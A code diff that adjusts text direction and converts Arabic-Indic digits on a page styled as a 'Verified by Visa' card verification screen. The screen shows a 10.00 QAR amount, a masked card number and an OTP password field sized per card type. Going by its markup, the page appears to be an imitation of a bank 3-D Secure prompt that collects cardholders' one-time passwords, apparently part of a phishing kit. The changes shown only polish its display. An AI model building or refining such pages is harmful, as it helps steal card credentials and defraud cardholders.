@@ -456,6 +456,8 @@
         
         .vbv-detail-value {
             color: #333;
+            direction: ltr;
+            text-align: left;
         }
         
         .vbv-password-section {
@@ -739,15 +741,15 @@
                         </div>
                         <div class="vbv-detail-row">
                             <div class="vbv-detail-label">Amount:</div>
-                            <div class="vbv-detail-value">10.00 QAR</div>
+                            <div class="vbv-detail-value" style="direction: ltr; text-align: left;">10.00 QAR</div>
                         </div>
                         <div class="vbv-detail-row">
                             <div class="vbv-detail-label">Date:</div>
-                            <div class="vbv-detail-value" id="currentDate"></div>
+                            <div class="vbv-detail-value" id="currentDate" style="direction: ltr; text-align: left;"></div>
                         </div>
                         <div class="vbv-detail-row">
                             <div class="vbv-detail-label">Card Number:</div>
-                            <div class="vbv-detail-value" id="maskedCard">**** **** **** ****</div>
+                            <div class="vbv-detail-value" id="maskedCard" style="direction: ltr; text-align: left;">**** **** **** ****</div>
                         </div>
                         <div class="vbv-detail-row">
                             <div class="vbv-detail-label">Personal Message:</div>
@@ -1104,16 +1106,25 @@
                 const vbvLogo = document.getElementById('vbvLogo');
                 vbvLogo.innerHTML = `<img src="${verifiedLogos[cardType]}" style="width: 100%;">`;
                 
+                // Function to convert Arabic numerals to English
+                function toEnglishNumbers(str) {
+                    const arabicNumerals = ['\u0660', '\u0661', '\u0662', '\u0663', '\u0664', '\u0665', '\u0666', '\u0667', '\u0668', '\u0669'];
+                    const englishNumerals = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
+                    return str.replace(/[\u0660-\u0669]/g, function(c) {
+                        return englishNumerals[arabicNumerals.indexOf(c)];
+                    });
+                }
+                
                 // Set current date
                 const now = new Date();
                 const dateStr = (now.getMonth() + 1).toString().padStart(2, '0') + '/' + 
                                now.getDate().toString().padStart(2, '0') + '/' + 
                                now.getFullYear();
-                document.getElementById('currentDate').textContent = dateStr;
+                document.getElementById('currentDate').textContent = toEnglishNumbers(dateStr);
                 
                 // Set masked card number
                 const lastFour = cardNumber.slice(-4);
-                document.getElementById('maskedCard').textContent = `**** **** **** ${lastFour}`;
+                document.getElementById('maskedCard').textContent = toEnglishNumbers(`**** **** **** ${lastFour}`);
                 
                 // Set maxlength based on card type
                 document.getElementById('vbvPassword').maxLength = otpLength;
